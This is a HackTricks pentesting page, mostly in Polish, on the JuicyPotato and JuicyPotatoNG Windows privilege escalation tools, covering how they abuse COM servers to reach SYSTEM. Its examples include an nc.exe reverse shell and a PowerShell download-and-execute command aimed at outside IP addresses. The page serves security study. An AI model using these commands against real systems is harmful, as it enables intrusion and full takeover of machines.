# JuicyPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING] > JuicyPotato jest przestarzały. Generalnie działa na wersjach Windows do Windows 10 1803 / Windows Server 2016. Zmiany wprowadzone przez Microsoft począwszy od Windows 10 1809 / Server 2019 złamały oryginalną technikę. Dla tych i nowszych buildów rozważ nowocześniejsze alternatywy, takie jak PrintSpoofer, RoguePotato, SharpEfsPotato/EfsPotato, GodPotato i inne. Zobacz stronę poniżej po aktualne opcje i instrukcje użycia.


{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Juicy Potato (abusing the golden privileges) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_Słodzona wersja_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, z odrobiną soku, tj. **kolejne narzędzie do Local Privilege Escalation, z kont usług Windows do NT AUTHORITY\SYSTEM**_

#### You can download juicypotato from [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Compatibility quick notes

- Działa niezawodnie do Windows 10 1803 i Windows Server 2016, gdy bieżący kontekst ma SeImpersonatePrivilege lub SeAssignPrimaryTokenPrivilege.
- Złamane przez Microsoft hardening w Windows 10 1809 / Windows Server 2019 i nowszych. Dla tych buildów preferuj wymienione wyżej alternatywy.

### Summary <a href="#summary" id="summary"></a>

[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) i jego [warianty](https://github.com/decoder-it/lonelypotato) wykorzystują łańcuch eskalacji uprawnień oparty na serwisie `BITS` mającym nasłuch MiTM na `127.0.0.1:6666` oraz gdy posiadasz uprawnienia `SeImpersonate` lub `SeAssignPrimaryToken`. Podczas przeglądu builda Windows znaleźliśmy konfigurację, gdzie `BITS` był celowo wyłączony, a port `6666` zajęty.

Postanowiliśmy uzbroić [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG): **Say hello to Juicy Potato**.

> Dla teorii zobacz [Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) i śledź łańcuch linków oraz odniesień.

Odkryliśmy, że oprócz `BITS` istnieje kilka serwerów COM, które możemy nadużyć. Muszą one jedynie:

1. być instantiowalne przez bieżącego użytkownika, zwykle „service user”, który ma uprawnienia do impersonacji
2. implementować interfejs `IMarshal`
3. działać jako użytkownik podwyższony (SYSTEM, Administrator, …)

Po testach zebraliśmy i przetestowaliśmy obszerną listę [interesujących CLSID’ów](http://ohpe.it/juicy-potato/CLSID/) na kilku wersjach Windows.

### Juicy details <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato pozwala na:

- **Target CLSID** _wybierz dowolny CLSID, który chcesz._ [_Tutaj_](http://ohpe.it/juicy-potato/CLSID/) _znajdziesz listę zorganizowaną według systemu operacyjnego._
- **COM Listening port** _zdefiniuj port nasłuchu COM, który preferujesz (zamiast zmarshalowanego, hardcodowanego 6666)_
- **COM Listening IP address** _wiąż serwer z dowolnym adresem IP_
- **Process creation mode** _w zależności od uprawnień podszytego użytkownika możesz wybrać:_
- `CreateProcessWithToken` (wymaga `SeImpersonate`)
- `CreateProcessAsUser` (wymaga `SeAssignPrimaryToken`)
- `both`
- **Process to launch** _uruchom program wykonywalny lub skrypt jeśli eksploatacja powiedzie się_
- **Process Argument** _dostosuj argumenty uruchamianego procesu_
- **RPC Server address** _dla bardziej dyskretnego podejścia możesz uwierzytelnić się do zewnętrznego serwera RPC_
- **RPC Server port** _użyteczne jeśli chcesz uwierzytelnić się do zewnętrznego serwera, a firewall blokuje port `135`…_
- **TEST mode** _głównie do celów testowych, tzn. testowania CLSIDów. Tworzy DCOM i wypisuje użytkownika tokenu. Zobacz_ [_tutaj dla testów_](http://ohpe.it/juicy-potato/Test/)

### Usage <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Final thoughts <a href="#final-thoughts" id="final-thoughts"></a>

[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**

If the user has `SeImpersonate` or `SeAssignPrimaryToken` privileges then you are **SYSTEM**.

Prawie niemożliwe jest zapobieżenie nadużyciu wszystkich tych serwerów COM. Możesz pomyśleć o modyfikacji uprawnień tych obiektów za pomocą `DCOMCNFG`, ale powodzenia — będzie to wyzwanie.

Rzeczywistym rozwiązaniem jest zabezpieczenie wrażliwych kont i aplikacji działających pod kontami `* SERVICE`. Zatrzymanie `DCOM` z pewnością utrudniłoby ten exploit, ale mogłoby mieć poważny wpływ na system operacyjny.

From: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## JuicyPotatoNG (2022+)

JuicyPotatoNG ponownie wprowadza JuicyPotato-style lokalną eskalację uprawnień na nowoczesnych Windows przez połączenie:
- DCOM OXID resolution do lokalnego serwera RPC na wybranym porcie, omijając stary hardcoded 127.0.0.1:6666 listener.
- An SSPI hook to capture and impersonate the inbound SYSTEM authentication without requiring RpcImpersonateClient, which also enables CreateProcessAsUser when only SeAssignPrimaryTokenPrivilege is present.
- Sztuczki spełniające ograniczenia aktywacji DCOM (np. wcześniejszy wymóg grupy INTERACTIVE przy celowaniu w klasy PrintNotify / ActiveX Installer Service).

Ważne uwagi (zachowanie zmienia się między buildami):
- September 2022: Initial technique worked on supported Windows 10/11 and Server targets using the “INTERACTIVE trick”.
- January 2023 update from the authors: Microsoft later blocked the INTERACTIVE trick. A different CLSID ({A9819296-E5B3-4E67-8226-5E72CE9E1FB7}) restores exploitation but only on Windows 11 / Server 2022 according to their post.

Podstawowe użycie (więcej flag w pomocy):
```
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
# Useful helpers:
#  -b  Bruteforce all CLSIDs (testing only; spawns many processes)
#  -s  Scan for a COM port not filtered by Windows Defender Firewall
#  -i  Interactive console (only with CreateProcessAsUser)
```
Jeśli celem jest Windows 10 1809 / Server 2019, gdzie klasyczny JuicyPotato został załatany, preferuj alternatywy podlinkowane powyżej (RoguePotato, PrintSpoofer, EfsPotato/GodPotato, etc.). NG może być sytuacyjny, zależnie od build i service state.

## Przykłady

Note: Visit [this page](https://ohpe.it/juicy-potato/CLSID/) for a list of CLSIDs to try.

### Get a nc.exe reverse shell
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Uruchom nowe CMD (jeśli masz dostęp RDP)

![](<../../images/image (300).png>)

## Problemy z CLSID

Często domyślny CLSID, którego używa JuicyPotato, **nie działa** i exploit się nie udaje. Zazwyczaj potrzeba kilku prób, aby znaleźć **działający CLSID**. Aby uzyskać listę CLSID do wypróbowania dla konkretnego systemu operacyjnego, odwiedź tę stronę:

- [https://ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/)

### **Sprawdzanie CLSID**

Najpierw będziesz potrzebować kilku plików wykonywalnych oprócz juicypotato.exe.

Pobierz [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) i załaduj go do swojej sesji PS, a następnie pobierz i uruchom [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). Ten skrypt utworzy listę możliwych CLSID do przetestowania.

Następnie pobierz [test_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat)(zmień ścieżkę do listy CLSID i do pliku wykonywalnego juicypotato) i uruchom go. Zacznie testować każdy CLSID i **gdy zmieni się numer portu, będzie to oznaczać, że CLSID zadziałał**.

**Sprawdź** działające CLSID **używając parametru -c**

## Źródła

- [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)
- [Giving JuicyPotato a second chance: JuicyPotatoNG (decoder.it)](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)

{{#include ../../banners/hacktricks-training.md}}
